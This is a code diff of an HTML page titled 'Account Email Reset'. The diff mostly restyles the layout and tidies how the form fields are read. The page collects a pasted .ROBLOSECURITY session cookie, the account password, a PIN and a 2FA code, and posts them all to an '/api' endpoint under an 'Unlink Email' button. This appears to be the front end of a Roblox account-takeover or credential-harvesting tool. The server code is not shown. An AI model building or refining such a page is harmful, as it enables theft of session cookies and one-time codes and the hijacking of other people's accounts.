@@ -6,6 +6,7 @@
 <title>Account Email Reset</title>
 <style>
   :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
   body { margin:0; font:14px/1.5 system-ui,sans-serif;
          background:#0b0d10; color:#e6e8eb;
          display:flex; min-height:100vh; align-items:center;
@@ -13,23 +14,30 @@
   .card { width:100%; max-width:520px; background:#14171c;
           border:1px solid #23272e; border-radius:12px;
           padding:24px; }
-  h1 { font-size:16px; margin:0 0 16px; letter-spacing:.2px; }
+  h1 { font-size:16px; margin:0 0 20px; letter-spacing:.2px; }
+  .field { margin-bottom:16px; }
+  .field:last-of-type { margin-bottom:0; }
   label { display:block; font-size:12px; color:#8b919a;
-          margin:12px 0 4px; }
-  input, textarea { width:100%; box-sizing:border-box;
+          margin-bottom:6px; }
+  label .hint { color:#5b616b; font-weight:400; }
+  input, textarea { width:100%; display:block;
           background:#0b0d10; color:#e6e8eb;
           border:1px solid #2a2f37; border-radius:8px;
-          padding:10px; font:inherit; }
-  textarea { min-height:80px; resize:vertical;
+          padding:10px 12px; font:inherit;
+          transition: border-color .15s; }
+  input:focus, textarea:focus { outline:none;
+          border-color:#4a515c; }
+  textarea { min-height:72px; resize:vertical;
              font-family:ui-monospace,monospace; font-size:12px; }
-  button { margin-top:16px; width:100%; padding:11px;
+  button { margin-top:20px; width:100%; padding:11px;
            background:#e6e8eb; color:#0b0d10; border:0;
            border-radius:8px; font-weight:600; cursor:pointer; }
   button:disabled { opacity:.5; cursor:default; }
-  pre { margin-top:16px; background:#0b0d10; border:1px solid #23272e;
+  pre { margin-top:20px; background:#0b0d10; border:1px solid #23272e;
         border-radius:8px; padding:12px; font-size:12px;
         white-space:pre-wrap; word-break:break-word;
-        max-height:260px; overflow:auto; }
+        max-height:260px; overflow:auto;
+        font-family:ui-monospace,monospace; }
   .ok  { color:#4ade80; } .bad { color:#f87171; }
 </style>
 </head>
@@ -37,16 +45,26 @@
 <div class="card">
   <h1>Account Email Reset</h1>
 
-  <label>ROBLOSECURITY cookie</label>
-  <textarea id="cookie" placeholder="paste .ROBLOSECURITY value"></textarea>
+  <div class="field">
+    <label for="cookie">ROBLOSECURITY cookie</label>
+    <textarea id="cookie" placeholder="paste .ROBLOSECURITY value"></textarea>
+  </div>
 
-  <label>Account password</label>
-  <input id="password" type="password" autocomplete="off">
+  <div class="field">
+    <label for="password">Account password</label>
+    <input id="password" type="password" autocomplete="off">
+  </div>
 
-  <label>Account PIN (optional)</label>
-  <label>2FA code (if account has 2-step verification)</label>
-<input id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8">
-  <input id="pin" type="password" autocomplete="off">
+  <div class="field">
+    <label for="pin">Account PIN <span class="hint">— optional</span></label>
+    <input id="pin" type="password" autocomplete="off">
+  </div>
+
+  <div class="field">
+    <label for="code">2FA code <span class="hint">— only if account has 2-step verification</span></label>
+    <input id="code" type="text" inputmode="numeric"
+           autocomplete="one-time-code" maxlength="8">
+  </div>
 
   <button id="go">Unlink Email</button>
   <pre id="out">idle</pre>
@@ -60,6 +78,7 @@ $("go").addEventListener("click", async () => {
   const cookie   = $("cookie").value.trim();
   const password = $("password").value;
   const pin      = $("pin").value.trim();
+  const code     = $("code").value.trim();
 
   if (!cookie || !password) {
     out.className = "bad";
@@ -75,7 +94,7 @@ $("go").addEventListener("click", async () => {
     const res = await fetch("/api", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ cookie, password, pin, code: $("code").value.trim() })
+      body: JSON.stringify({ cookie, password, pin, code })
     });
     const data = await res.json();
 
